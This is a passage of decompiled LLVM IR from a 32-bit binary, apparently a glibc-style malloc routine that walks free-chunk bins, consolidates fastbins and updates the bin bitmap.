dec_label_pc_805fab9:                             ; preds = %dec_label_pc_805faaf
  %v2_805fabd = udiv i32 %v1_805fe06, 8
  store i32 %v2_805fabd, i32* %eax.global-to-local, align 4
  %v1_805fac0 = mul nuw i32 %v2_805fabd, 8
  %v2_805fac0 = add i32 %v1_805fac0, ptrtoint (i32* @global_var_807f14c.730 to i32)
  store i32 %v2_805fac0, i32* @ecx, align 4
  %v1_805facb = add i32 %v1_805fac0, add (i32 ptrtoint (i32* @global_var_807f14c.730 to i32), i32 12)
  %v2_805facb = inttoptr i32 %v1_805facb to i32*
  %v3_805facb = load i32, i32* %v2_805facb, align 4
  store i32 %v3_805facb, i32* %edx.global-to-local, align 4
  %v12_805face = icmp eq i32 %v3_805facb, %v2_805fac0
  br i1 %v12_805face, label %dec_label_pc_805fbec.preheader, label %dec_label_pc_805fad6

dec_label_pc_805fad6:                             ; preds = %dec_label_pc_805fab9
  store i32 %v1_805fe06, i32* %ebx.global-to-local, align 4
  %v1_805fada = add i32 %v3_805facb, 12
  %v2_805fada = inttoptr i32 %v1_805fada to i32*
  %v3_805fada = load i32, i32* %v2_805fada, align 4
  store i32 %v3_805fada, i32* %eax.global-to-local, align 4
  %v2_805fadd = or i32 %v1_805fe06, 4
  %v3_805fadd = add i32 %v3_805facb, %v2_805fadd
  %v4_805fadd = inttoptr i32 %v3_805fadd to i32*
  %v5_805fadd = load i32, i32* %v4_805fadd, align 4
  %v6_805fadd = or i32 %v5_805fadd, 1
  store i32 %v6_805fadd, i32* %v4_805fadd, align 4
  %v0_805fae2 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fae2 = load i32, i32* @ecx, align 4
  %v2_805fae2 = add i32 %v1_805fae2, 12
  %v3_805fae2 = inttoptr i32 %v2_805fae2 to i32*
  store i32 %v0_805fae2, i32* %v3_805fae2, align 4
  %v0_805fae5 = load i32, i32* @ecx, align 4
  %v1_805fae5 = load i32, i32* %eax.global-to-local, align 4
  %v2_805fae5 = add i32 %v1_805fae5, 8
  %v3_805fae5 = inttoptr i32 %v2_805fae5 to i32*
  store i32 %v0_805fae5, i32* %v3_805fae5, align 4
  br label %dec_label_pc_805fae8

dec_label_pc_805fae8:                             ; preds = %dec_label_pc_805faa7, %dec_label_pc_805fad6
  %v0_805fae8 = load i32, i32* %edx.global-to-local, align 4
  %v1_805fae8 = add i32 %v0_805fae8, 8
  store i32 %v1_805fae8, i32* @ebx, align 4
  br label %dec_label_pc_8060191

dec_label_pc_805faf0:                             ; preds = %dec_label_pc_805faaf
  %v0_805faf4 = call i32 @__malloc_largebin_index()
  store i32 %v0_805faf4, i32* %eax.global-to-local, align 4
  %v3_805faf9 = and i8 %v0_805fa66, 2
  %v4_805faf9 = icmp eq i8 %v3_805faf9, 0
  br i1 %v4_805faf9, label %dec_label_pc_805fbec.preheader, label %dec_label_pc_805fb06

dec_label_pc_805fb06:                             ; preds = %dec_label_pc_805faf0
  store i32 ptrtoint (i8* @global_var_807f120.729 to i32), i32* %stack_var_-92, align 4
  %v2_805fb0e = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807f120.729 to i32*))
  store i32 %v2_805fb0e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fbec.preheader

dec_label_pc_805fbec.preheader:                   ; preds = %dec_label_pc_805fb06, %dec_label_pc_805fab9, %dec_label_pc_805faf0
  %stack_var_-40.0.ph = phi i32 [ %v2_805fabd, %dec_label_pc_805fab9 ], [ %v0_805faf4, %dec_label_pc_805fb06 ], [ %v0_805faf4, %dec_label_pc_805faf0 ]
  %v1_805fb42 = add i32 %v1_805fe06, 16
  %v0_805fbec107 = load i32, i32* @global_var_807f160.733, align 32
  store i32 %v0_805fbec107, i32* @ebp, align 4
  %v9_805fbf2109 = icmp eq i32 %v0_805fbec107, 134738260
  %v1_805fbf8111 = icmp eq i1 %v9_805fbf2109, false
  br i1 %v1_805fbf8111, label %dec_label_pc_805fb1b, label %dec_label_pc_805fbfe

dec_label_pc_805fb1b:                             ; preds = %dec_label_pc_805fbec.preheader, %bb82
  %v0_805fbec112 = phi i32 [ %v0_805fbec, %bb82 ], [ %v0_805fbec107, %dec_label_pc_805fbec.preheader ]
  %v1_805fb1b = add i32 %v0_805fbec112, 4
  %v2_805fb1b = inttoptr i32 %v1_805fb1b to i32*
  %v3_805fb1b = load i32, i32* %v2_805fb1b, align 4
  %v1_805fb1e = add i32 %v0_805fbec112, 12
  %v2_805fb1e = inttoptr i32 %v1_805fb1e to i32*
  %v3_805fb1e = load i32, i32* %v2_805fb1e, align 4
  store i32 %v3_805fb1e, i32* %edx.global-to-local, align 4
  %v1_805fb21 = and i32 %v3_805fb1b, -4
  store i32 %v1_805fb21, i32* @edi, align 4
  br i1 %v6_805fab7, label %dec_label_pc_805fb4d, label %dec_label_pc_805fb2e

dec_label_pc_805fb2e:                             ; preds = %dec_label_pc_805fb1b
  %v9_805fb2e = icmp eq i32 %v3_805fb1e, 134738260
  %v1_805fb34 = icmp eq i1 %v9_805fb2e, false
  br i1 %v1_805fb34, label %dec_label_pc_805fb4d, label %dec_label_pc_805fb36

dec_label_pc_805fb36:                             ; preds = %dec_label_pc_805fb2e
  %v1_805fb36 = load i32, i32* @global_var_807f150.731, align 16
  %v12_805fb36 = icmp eq i32 %v0_805fbec112, %v1_805fb36
  %v1_805fb3c = icmp eq i1 %v12_805fb36, false
  br i1 %v1_805fb3c, label %dec_label_pc_805fb4d, label %dec_label_pc_805fb3e

dec_label_pc_805fb3e:                             ; preds = %dec_label_pc_805fb36
  store i32 %v1_805fb42, i32* %eax.global-to-local, align 4
  %v6_805fb47 = icmp ugt i32 %v1_805fb21, %v1_805fb42
  br i1 %v6_805fb47, label %dec_label_pc_806012c, label %dec_label_pc_805fb4d

dec_label_pc_805fb4d:                             ; preds = %dec_label_pc_805fb3e, %dec_label_pc_805fb36, %dec_label_pc_805fb2e, %dec_label_pc_805fb1b
  store i32 ptrtoint (i32* @global_var_807f154.732 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_805fb1e, i32* @global_var_807f160.733, align 4
  %v2_805fb55 = add i32 %v3_805fb1e, 8
  %v3_805fb55 = inttoptr i32 %v2_805fb55 to i32*
  store i32 ptrtoint (i32* @global_var_807f154.732 to i32), i32* %v3_805fb55, align 4
  %v0_805fb58 = load i32, i32* @edi, align 4
  %v15_805fb58 = icmp eq i32 %v0_805fb58, %v1_805fe06
  br i1 %v15_805fb58, label %dec_label_pc_806016d, label %dec_label_pc_805fb62

dec_label_pc_805fb62:                             ; preds = %dec_label_pc_805fb4d
  %v6_805fb68 = icmp ugt i32 %v0_805fb58, 255
  br i1 %v6_805fb68, label %dec_label_pc_805fb7b, label %dec_label_pc_805fb6a

dec_label_pc_805fb6a:                             ; preds = %dec_label_pc_805fb62
  %v2_805fb6c = udiv i32 %v0_805fb58, 8
  store i32 %v2_805fb6c, i32* %esi.global-to-local, align 4
  %v1_805fb6f = mul nuw i32 %v2_805fb6c, 8
  %v2_805fb6f = add i32 %v1_805fb6f, 134738252
  store i32 %v2_805fb6f, i32* @ebx, align 4
  %v1_805fb76 = add i32 %v1_805fb6f, 134738260
  %v2_805fb76 = inttoptr i32 %v1_805fb76 to i32*
  %v3_805fb76 = load i32, i32* %v2_805fb76, align 4
  store i32 %v3_805fb76, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fbc4

dec_label_pc_805fb7b:                             ; preds = %dec_label_pc_805fb62
  store i32 %v0_805fb58, i32* @eax, align 4
  %v0_805fb7d = call i32 @__malloc_largebin_index()
  store i32 %v0_805fb7d, i32* %esi.global-to-local, align 4
  %v1_805fb84 = mul i32 %v0_805fb7d, 8
  %v2_805fb84 = add i32 %v1_805fb84, ptrtoint (i32* @global_var_807f14c.730 to i32)
  store i32 %v2_805fb84, i32* %eax.global-to-local, align 4
  %v1_805fb8b = add i32 %v1_805fb84, add (i32 ptrtoint (i32* @global_var_807f14c.730 to i32), i32 8)
  %v2_805fb8b = inttoptr i32 %v1_805fb8b to i32*
  %v3_805fb8b = load i32, i32* %v2_805fb8b, align 4
  store i32 %v3_805fb8b, i32* %edx.global-to-local, align 4
  %v12_805fb8e = icmp eq i32 %v3_805fb8b, %v2_805fb84
  store i32 %v3_805fb8b, i32* @ebx, align 4
  br i1 %v12_805fb8e, label %dec_label_pc_805fbc4, label %dec_label_pc_805fb98

dec_label_pc_805fb98:                             ; preds = %dec_label_pc_805fb7b
  %v1_805fb98 = add i32 %v1_805fb84, add (i32 ptrtoint (i32* @global_var_807f14c.730 to i32), i32 12)
  %v2_805fb98 = inttoptr i32 %v1_805fb98 to i32*
  %v3_805fb98 = load i32, i32* %v2_805fb98, align 4
  store i32 %v3_805fb98, i32* @ebx, align 4
  %v0_805fb9b = load i32, i32* @edi, align 4
  %v2_805fb9b = add i32 %v3_805fb98, 4
  %v3_805fb9b = inttoptr i32 %v2_805fb9b to i32*
  %v4_805fb9b = load i32, i32* %v3_805fb9b, align 4
  %v10_805fb9b = icmp ult i32 %v0_805fb9b, %v4_805fb9b
  %v1_805fb9e = icmp eq i1 %v10_805fb9b, false
  br i1 %v1_805fb9e, label %dec_label_pc_805fba6, label %dec_label_pc_805fbc4

dec_label_pc_805fba6:                             ; preds = %dec_label_pc_805fb98
  %v1_805fba8 = or i32 %v0_805fb9b, 1
  store i32 %v1_805fba8, i32* %eax.global-to-local, align 4
  store i32 %v3_805fb8b, i32* %ebx.global-to-local, align 4
  %v2_805fbbc100 = add i32 %v3_805fb8b, 4
  %v3_805fbbc101 = inttoptr i32 %v2_805fbbc100 to i32*
  %v4_805fbbc102 = load i32, i32* %v3_805fbbc101, align 4
  %v10_805fbbc104 = icmp ult i32 %v1_805fba8, %v4_805fbbc102
  br i1 %v10_805fbbc104, label %dec_label_pc_805fbad, label %dec_label_pc_805fbc1

dec_label_pc_805fbad:                             ; preds = %dec_label_pc_805fba6, %dec_label_pc_805fbad
  %v0_805fbc1105 = phi i32 [ %v3_805fbb1, %dec_label_pc_805fbad ], [ %v3_805fb8b, %dec_label_pc_805fba6 ]
  store i32 %v0_805fbc1105, i32* %ecx.global-to-local, align 4
  %v1_805fbb1 = add i32 %v0_805fbc1105, 8
  %v2_805fbb1 = inttoptr i32 %v1_805fbb1 to i32*
  %v3_805fbb1 = load i32, i32* %v2_805fbb1, align 4
  store i32 %v3_805fbb1, i32* %ecx.global-to-local, align 4
  store i32 %v3_805fbb1, i32* %ebx.global-to-local, align 4
  %v2_805fbbc = add i32 %v3_805fbb1, 4
  %v3_805fbbc = inttoptr i32 %v2_805fbbc to i32*
  %v4_805fbbc = load i32, i32* %v3_805fbbc, align 4
  %v10_805fbbc = icmp ult i32 %v1_805fba8, %v4_805fbbc
  br i1 %v10_805fbbc, label %dec_label_pc_805fbad, label %dec_label_pc_805fbc1

dec_label_pc_805fbc1:                             ; preds = %dec_label_pc_805fbad, %dec_label_pc_805fba6
  %v0_805fbc1.lcssa = phi i32 [ %v3_805fb8b, %dec_label_pc_805fba6 ], [ %v3_805fbb1, %dec_label_pc_805fbad ]
  %v1_805fbc1 = add i32 %v0_805fbc1.lcssa, 12
  %v2_805fbc1 = inttoptr i32 %v1_805fbc1 to i32*
  %v3_805fbc1 = load i32, i32* %v2_805fbc1, align 4
  store i32 %v3_805fbc1, i32* @ebx, align 4
  br label %dec_label_pc_805fbc4

dec_label_pc_805fbc4:                             ; preds = %dec_label_pc_805fb6a, %dec_label_pc_805fb98, %dec_label_pc_805fb7b, %dec_label_pc_805fbc1
  %v0_805fbc4 = phi i32 [ %v0_805fb7d, %dec_label_pc_805fb7b ], [ %v0_805fb7d, %dec_label_pc_805fbc1 ], [ %v0_805fb7d, %dec_label_pc_805fb98 ], [ %v2_805fb6c, %dec_label_pc_805fb6a ]
  %stack_var_-64.1 = phi i32 [ %v3_805fb8b, %dec_label_pc_805fb7b ], [ %v0_805fbc1.lcssa, %dec_label_pc_805fbc1 ], [ %v2_805fb84, %dec_label_pc_805fb98 ], [ %v3_805fb76, %dec_label_pc_805fb6a ]
  %v1_805fbc6 = urem i32 %v0_805fbc4, 32
  %v2_805fbc6 = icmp eq i32 %v1_805fbc6, 0
  store i32 %v1_805fbc6, i32* %esi.global-to-local, align 4
  store i32 %v1_805fbc6, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_805fbd0 = sdiv i32 %v0_805fbc4, 32
  store i32 %v2_805fbd0, i32* %edx.global-to-local, align 4
  br i1 %v2_805fbc6, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_805fbc4
  %v5_805fbd3 = shl i32 1, %v1_805fbc6
  store i32 %v5_805fbd3, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_805fbc4, %bb
  %v5_805fbd5 = phi i32 [ 1, %dec_label_pc_805fbc4 ], [ %v5_805fbd3, %bb ]
  %v1_805fbd5 = mul nsw i32 %v2_805fbd0, 4
  %v2_805fbd5 = add i32 %v1_805fbd5, ptrtoint (i32* @global_var_807f454.734 to i32)
  %v3_805fbd5 = inttoptr i32 %v2_805fbd5 to i32*
  %v4_805fbd5 = load i32, i32* %v3_805fbd5, align 4
  %v6_805fbd5 = or i32 %v4_805fbd5, %v5_805fbd5
  store i32 %v6_805fbd5, i32* %v3_805fbd5, align 4
  %v0_805fbdc = load i32, i32* @ebx, align 4
  %v1_805fbdc = load i32, i32* @ebp, align 4
  %v2_805fbdc = add i32 %v1_805fbdc, 12
  %v3_805fbdc = inttoptr i32 %v2_805fbdc to i32*
  store i32 %v0_805fbdc, i32* %v3_805fbdc, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_805fbe3 = load i32, i32* @ebp, align 4
  %v2_805fbe3 = add i32 %v1_805fbe3, 8
  %v3_805fbe3 = inttoptr i32 %v2_805fbe3 to i32*
  store i32 %stack_var_-64.1, i32* %v3_805fbe3, align 4
  %v0_805fbe6 = load i32, i32* @ebp, align 4
  %v1_805fbe6 = load i32, i32* @esi, align 4
  %v2_805fbe6 = add i32 %v1_805fbe6, 12
  %v3_805fbe6 = inttoptr i32 %v2_805fbe6 to i32*
  store i32 %v0_805fbe6, i32* %v3_805fbe6, align 4
  %v0_805fbe9 = load i32, i32* @ebp, align 4
  %v1_805fbe9 = load i32, i32* @ebx, align 4
  %v2_805fbe9 = add i32 %v1_805fbe9, 8
  %v3_805fbe9 = inttoptr i32 %v2_805fbe9 to i32*
  store i32 %v0_805fbe9, i32* %v3_805fbe9, align 4
  %v0_805fbec = load i32, i32* @global_var_807f160.733, align 32
  store i32 %v0_805fbec, i32* @ebp, align 4
  %v9_805fbf2 = icmp eq i32 %v0_805fbec, 134738260
  %v1_805fbf8 = icmp eq i1 %v9_805fbf2, false
  br i1 %v1_805fbf8, label %dec_label_pc_805fb1b, label %dec_label_pc_805fbfe

dec_label_pc_805fbfe:                             ; preds = %bb82, %dec_label_pc_805fbec.preheader
  br i1 %v8_805faaf, label %dec_label_pc_805fc8c, label %dec_label_pc_805fc0c

dec_label_pc_805fc0c:                             ; preds = %dec_label_pc_805fbfe
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_805fc10 = mul i32 %stack_var_-40.0.ph, 8
  %v2_805fc10 = add i32 %v1_805fc10, ptrtoint (i32* @global_var_807f14c.730 to i32)
  store i32 %v2_805fc10, i32* %edx.global-to-local, align 4
  %v1_805fc17 = add i32 %v1_805fc10, add (i32 ptrtoint (i32* @global_var_807f14c.730 to i32), i32 12)
  %v2_805fc17 = inttoptr i32 %v1_805fc17 to i32*
  %storemerge1.pre = load i32, i32* %v2_805fc17, align 4
  br label %dec_label_pc_805fc88

dec_label_pc_805fc1c:                             ; preds = %dec_label_pc_805fc88
  %v1_805fc1c = add i32 %v4_805fc33, 4
  %v2_805fc1c = inttoptr i32 %v1_805fc1c to i32*
  %v3_805fc1c = load i32, i32* %v2_805fc1c, align 4
  store i32 %v3_805fc1c, i32* %ebx.global-to-local, align 4
  %v1_805fc1f = add i32 %v4_805fc33, 12
  %v2_805fc1f = inttoptr i32 %v1_805fc1f to i32*
  %v3_805fc1f = load i32, i32* %v2_805fc1f, align 4
  store i32 %v3_805fc1f, i32* @ecx, align 4
  %v1_805fc22 = and i32 %v3_805fc1c, -4
  store i32 %v1_805fc22, i32* @ebx, align 4
  %v10_805fc25 = icmp ult i32 %v1_805fc22, %v1_805fe06
  br i1 %v10_805fc25, label %dec_label_pc_805fc88, label %dec_label_pc_805fc2b

dec_label_pc_805fc2b:                             ; preds = %dec_label_pc_805fc1c
  %v1_805fc2b = add i32 %v4_805fc33, 8
  %v2_805fc2b = inttoptr i32 %v1_805fc2b to i32*
  %v3_805fc2b = load i32, i32* %v2_805fc2b, align 4
  store i32 %v3_805fc2b, i32* @edx, align 4
  %v1_805fc2e = add i32 %v3_805fc2b, 12
  %v2_805fc2e = inttoptr i32 %v1_805fc2e to i32*
  %v3_805fc2e = load i32, i32* %v2_805fc2e, align 4
  %v15_805fc2e = icmp eq i32 %v3_805fc2e, %v4_805fc33
  %v1_805fc31 = icmp eq i1 %v15_805fc2e, false
  br i1 %v1_805fc31, label %dec_label_pc_805fc38, label %dec_label_pc_805fc33

dec_label_pc_805fc33:                             ; preds = %dec_label_pc_805fc2b
  %v1_805fc33 = add i32 %v3_805fc1f, 8
  %v2_805fc33 = inttoptr i32 %v1_805fc33 to i32*
  %v3_805fc33 = load i32, i32* %v2_805fc33, align 4
  %v15_805fc33 = icmp eq i32 %v3_805fc33, %v4_805fc33
  br i1 %v15_805fc33, label %dec_label_pc_805fc3d, label %dec_label_pc_805fc38

dec_label_pc_805fc38:                             ; preds = %dec_label_pc_805fc33, %dec_label_pc_805fc2b
  %v0_805fc38 = call i32 @abort()
  store i32 %v0_805fc38, i32* %eax.global-to-local, align 4
  %v0_805fc3d.pre = load i32, i32* @ebx, align 4
  %v0_805fc43.pre = load i32, i32* @ecx, align 4
  %v1_805fc43.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805fc3d

dec_label_pc_805fc3d:                             ; preds = %dec_label_pc_805fc33, %dec_label_pc_805fc38
  %v1_805fc43 = phi i32 [ %v3_805fc2b, %dec_label_pc_805fc33 ], [ %v1_805fc43.pre, %dec_label_pc_805fc38 ]
  %v0_805fc43 = phi i32 [ %v3_805fc1f, %dec_label_pc_805fc33 ], [ %v0_805fc43.pre, %dec_label_pc_805fc38 ]
  %v0_805fc3d = phi i32 [ %v1_805fc22, %dec_label_pc_805fc33 ], [ %v0_805fc3d.pre, %dec_label_pc_805fc38 ]
  %v5_805fc3f = sub i32 %v0_805fc3d, %v1_805fe06
  store i32 %v5_805fc3f, i32* %esi.global-to-local, align 4
  %v2_805fc43 = add i32 %v1_805fc43, 12
  %v3_805fc43 = inttoptr i32 %v2_805fc43 to i32*
  store i32 %v0_805fc43, i32* %v3_805fc43, align 4
  %v0_805fc46 = load i32, i32* @edx, align 4
  %v1_805fc46 = load i32, i32* @ecx, align 4
  %v2_805fc46 = add i32 %v1_805fc46, 8
  %v3_805fc46 = inttoptr i32 %v2_805fc46 to i32*
  store i32 %v0_805fc46, i32* %v3_805fc46, align 4
  %v0_805fc49 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fc49 = add i32 %v0_805fc49, 8
  store i32 %v1_805fc49, i32* @ecx, align 4
  %v0_805fc4c = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_805fc4c, 16
  br i1 %tmp128, label %dec_label_pc_806017b, label %dec_label_pc_805fc55

dec_label_pc_805fc55:                             ; preds = %dec_label_pc_805fc3d
  %v2_805fc59 = add i32 %v0_805fc49, %v1_805fe06
  store i32 %v2_805fc59, i32* %edx.global-to-local, align 4
  %v1_805fc5c = or i32 %v1_805fe06, 1
  store i32 %v1_805fc5c, i32* %ebx.global-to-local, align 4
  %v2_805fc5f = add i32 %v0_805fc49, 4
  %v3_805fc5f = inttoptr i32 %v2_805fc5f to i32*
  store i32 %v1_805fc5c, i32* %v3_805fc5f, align 4
  %v0_805fc62 = load i32, i32* %esi.global-to-local, align 4
  %v1_805fc64 = or i32 %v0_805fc62, 1
  store i32 %v1_805fc64, i32* %eax.global-to-local, align 4
  %v0_805fc67 = load i32, i32* %edx.global-to-local, align 4
  %v1_805fc67 = load i32, i32* @ebp, align 4
  %v2_805fc67 = add i32 %v1_805fc67, 8
  %v3_805fc67 = inttoptr i32 %v2_805fc67 to i32*
  store i32 %v0_805fc67, i32* %v3_805fc67, align 4
  %v0_805fc6a = load i32, i32* %edx.global-to-local, align 4
  %v1_805fc6a = load i32, i32* @ebp, align 4
  %v2_805fc6a = add i32 %v1_805fc6a, 12
  %v3_805fc6a = inttoptr i32 %v2_805fc6a to i32*
  store i32 %v0_805fc6a, i32* %v3_805fc6a, align 4
  %v0_805fc6d = load i32, i32* %edx.global-to-local, align 4
  %v1_805fc6d = add i32 %v0_805fc6d, 8
  %v2_805fc6d = inttoptr i32 %v1_805fc6d to i32*
  store i32 ptrtoint (i32* @global_var_807f154.732 to i32), i32* %v2_805fc6d, align 4
  %v0_805fc74 = load i32, i32* %edx.global-to-local, align 4
  %v1_805fc74 = add i32 %v0_805fc74, 12
  %v2_805fc74 = inttoptr i32 %v1_805fc74 to i32*
  store i32 ptrtoint (i32* @global_var_807f154.732 to i32), i32* %v2_805fc74, align 4
  %v0_805fc7b = load i32, i32* %eax.global-to-local, align 4
  %v1_805fc7b = load i32, i32* %edx.global-to-local, align 4
  %v2_805fc7b = add i32 %v1_805fc7b, 4
  %v3_805fc7b = inttoptr i32 %v2_805fc7b to i32*
  store i32 %v0_805fc7b, i32* %v3_805fc7b, align 4
  %v0_805fc7e = load i32, i32* %esi.global-to-local, align 4
  %v1_805fc7e = load i32, i32* %edx.global-to-local, align 4
  %v3_805fc7e = add i32 %v1_805fc7e, %v0_805fc7e
  %v4_805fc7e = inttoptr i32 %v3_805fc7e to i32*
  store i32 %v0_805fc7e, i32* %v4_805fc7e, align 4
  br label %dec_label_pc_8060180

dec_label_pc_805fc88:                             ; preds = %dec_label_pc_805fc1c, %dec_label_pc_805fc0c
  %v4_805fc33 = phi i32 [ %storemerge1.pre, %dec_label_pc_805fc0c ], [ %v3_805fc1f, %dec_label_pc_805fc1c ]
  store i32 %v4_805fc33, i32* %eax.global-to-local, align 4
  %v12_805fc88 = icmp eq i32 %v4_805fc33, %v2_805fc10
  %v1_805fc8a = icmp eq i1 %v12_805fc88, false
  br i1 %v1_805fc8a, label %dec_label_pc_805fc1c, label %dec_label_pc_805fc8c.loopexit

dec_label_pc_805fc8c.loopexit:                    ; preds = %dec_label_pc_805fc88
  br label %dec_label_pc_805fc8c

dec_label_pc_805fc8c:                             ; preds = %dec_label_pc_805fc8c.loopexit, %dec_label_pc_805fbfe
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805fc95 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_805fc95, i32* %ecx.global-to-local, align 4
  %v2_805fc98 = udiv i32 %v1_805fc95, 32
  store i32 %v2_805fc98, i32* @edi, align 4
  %v1_805fc9b = mul nuw nsw i32 %v2_805fc98, 4
  %v2_805fc9b = add i32 %v1_805fc9b, ptrtoint (i32* @global_var_807f454.734 to i32)
  %v3_805fc9b = inttoptr i32 %v2_805fc9b to i32*
  %v4_805fc9b = load i32, i32* %v3_805fc9b, align 4
  store i32 %v4_805fc9b, i32* %edx.global-to-local, align 4
  %v1_805fca2 = mul i32 %v1_805fc95, 8
  %v2_805fca2 = add i32 %v1_805fca2, ptrtoint (i32* @global_var_807f14c.730 to i32)
  store i32 %v2_805fca2, i32* %ebx.global-to-local, align 4
  %v1_805fca9 = urem i32 %v1_805fc95, 32
  %v2_805fca9 = icmp eq i32 %v1_805fca9, 0
  store i32 %v1_805fca9, i32* %ecx.global-to-local, align 4
  br i1 %v2_805fca9, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_805fc8c
  %v5_805fcac = shl i32 1, %v1_805fca9
  store i32 %v5_805fcac, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_805fc8c, %bb83, %dec_label_pc_805fced
  %v1_805fcae = phi i32 [ %v1_805fcae.pre, %dec_label_pc_805fced ], [ %v4_805fc9b, %bb83 ], [ %v4_805fc9b, %dec_label_pc_805fc8c ]
  %v0_805fcb2 = phi i32 [ %v0_805fcae.pre, %dec_label_pc_805fced ], [ %v5_805fcac, %bb83 ], [ 1, %dec_label_pc_805fc8c ]
  %tmp84 = icmp ule i32 %v0_805fcb2, %v1_805fcae
  %v1_805fcb2 = icmp eq i32 %v0_805fcb2, 0
  %v1_805fcb4 = icmp eq i1 %v1_805fcb2, false
  %or.cond = and i1 %tmp84, %v1_805fcb4
  br i1 %or.cond, label %dec_label_pc_805fcb2.dec_label_pc_805fce2.preheader_crit_edge, label %dec_label_pc_805fcb6.preheader

dec_label_pc_805fcb2.dec_label_pc_805fce2.preheader_crit_edge: ; preds = %.preheader
  %v0_805fcdd12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805fce2.preheader

dec_label_pc_805fcb6.preheader:                   ; preds = %.preheader
  %v0_805fcb6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805fcb6

dec_label_pc_805fcb6:                             ; preds = %dec_label_pc_805fcb6.preheader, %dec_label_pc_805fcc0
  %v0_805fcb6 = phi i32 [ %v0_805fcb6.pre, %dec_label_pc_805fcb6.preheader ], [ %v1_805fcb6, %dec_label_pc_805fcc0 ]
  %v1_805fcb6 = add i32 %v0_805fcb6, 1
  store i32 %v1_805fcb6, i32* @edi, align 4
  %v6_805fcba = icmp ugt i32 %v1_805fcb6, 2
  br i1 %v6_805fcba, label %dec_label_pc_805fd71.loopexit, label %dec_label_pc_805fcc0

dec_label_pc_805fcc0:                             ; preds = %dec_label_pc_805fcb6
  %v1_805fcc0 = mul i32 %v1_805fcb6, 4
  %v2_805fcc0 = add i32 %v1_805fcc0, ptrtoint (i32* @global_var_807f454.734 to i32)
  %v3_805fcc0 = inttoptr i32 %v2_805fcc0 to i32*
  %v4_805fcc0 = load i32, i32* %v3_805fcc0, align 4
  store i32 %v4_805fcc0, i32* %edx.global-to-local, align 4
  %v1_805fcc7 = icmp eq i32 %v4_805fcc0, 0
  br i1 %v1_805fcc7, label %dec_label_pc_805fcb6, label %dec_label_pc_805fccb

dec_label_pc_805fccb:                             ; preds = %dec_label_pc_805fcc0
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_805fcd2 = mul i32 %v1_805fcb6, 256
  store i32 %v2_805fcd2, i32* %eax.global-to-local, align 4
  %v1_805fcd5 = add i32 %v2_805fcd2, ptrtoint (i32* @global_var_807f14c.730 to i32)
  store i32 %v1_805fcd5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805fce2.preheader

dec_label_pc_805fce2.preheader:                   ; preds = %dec_label_pc_805fcb2.dec_label_pc_805fce2.preheader_crit_edge, %dec_label_pc_805fccb
  %v0_805fcdd12 = phi i32 [ %v1_805fcd5, %dec_label_pc_805fccb ], [ %v0_805fcdd12.pre, %dec_label_pc_805fcb2.dec_label_pc_805fce2.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_805fccb ], [ %v0_805fcb2, %dec_label_pc_805fcb2.dec_label_pc_805fce2.preheader_crit_edge ]
  %v0_805fcf3 = phi i32 [ %v4_805fcc0, %dec_label_pc_805fccb ], [ %v1_805fcae, %dec_label_pc_805fcb2.dec_label_pc_805fce2.preheader_crit_edge ]
  %v2_805fce24 = and i32 %v0_805fcf3, %esi.promoted
  %v3_805fce25 = icmp eq i32 %v2_805fce24, 0
  br i1 %v3_805fce25, label %dec_label_pc_805fcdd, label %dec_label_pc_805fce6

dec_label_pc_805fcdd:                             ; preds = %dec_label_pc_805fce2.preheader, %dec_label_pc_805fcdd
  %v2_805fce014 = phi i32 [ %v2_805fce0, %dec_label_pc_805fcdd ], [ %esi.promoted, %dec_label_pc_805fce2.preheader ]
  %v0_805fcdd13 = phi i32 [ %v1_805fcdd, %dec_label_pc_805fcdd ], [ %v0_805fcdd12, %dec_label_pc_805fce2.preheader ]
  %v1_805fcdd = add i32 %v0_805fcdd13, 8
  %v2_805fce0 = mul i32 %v2_805fce014, 2
  %v2_805fce2 = and i32 %v2_805fce0, %v0_805fcf3
  %v3_805fce2 = icmp eq i32 %v2_805fce2, 0
  br i1 %v3_805fce2, label %dec_label_pc_805fcdd, label %dec_label_pc_805fce2.dec_label_pc_805fce6_crit_edge

dec_label_pc_805fce2.dec_label_pc_805fce6_crit_edge: ; preds = %dec_label_pc_805fcdd
  store i32 %v1_805fcdd, i32* %ebx.global-to-local, align 4
  store i32 %v2_805fce0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805fce6

dec_label_pc_805fce6:                             ; preds = %dec_label_pc_805fce2.dec_label_pc_805fce6_crit_edge, %dec_label_pc_805fce2.preheader
  %v0_805fced = phi i32 [ %v2_805fce0, %dec_label_pc_805fce2.dec_label_pc_805fce6_crit_edge ], [ %esi.promoted, %dec_label_pc_805fce2.preheader ]
  %v1_805fd10 = phi i32 [ %v1_805fcdd, %dec_label_pc_805fce2.dec_label_pc_805fce6_crit_edge ], [ %v0_805fcdd12, %dec_label_pc_805fce2.preheader ]
  %v1_805fce6 = add i32 %v1_805fd10, 12
  %v2_805fce6 = inttoptr i32 %v1_805fce6 to i32*
  %v3_805fce6 = load i32, i32* %v2_805fce6, align 4
  store i32 %v3_805fce6, i32* @ecx, align 4
  %v12_805fce9 = icmp eq i32 %v3_805fce6, %v1_805fd10
  %v1_805fceb = icmp eq i1 %v12_805fce9, false
